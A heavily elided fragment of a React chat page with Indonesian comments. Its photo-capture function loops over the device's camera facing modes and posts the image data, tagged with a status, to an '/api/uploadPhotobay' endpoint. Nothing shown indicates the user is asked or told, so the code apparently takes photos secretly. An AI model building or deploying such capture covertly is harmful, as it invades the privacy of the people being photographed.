...
const ChatPage = () => {
  ...
  const [chatWith] = useState("bayu"); // ID pengguna tujuan
  const [bayu] = useState("bayu"); // ID pengguna tujuan
...
const capturePhoto09090 = () => {
  ...
  // ========= FUNGSI CAPTURE FOTO =========
  const capturePhoto222222222 = async (status = "unknown") => {
    ...
    try {
      ...
      for (const facing of facingModes) {
        ...
        try {
          ...
          // Upload via server-side API
          const res = await fetch("/api/uploadPhotobay", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              imageData,
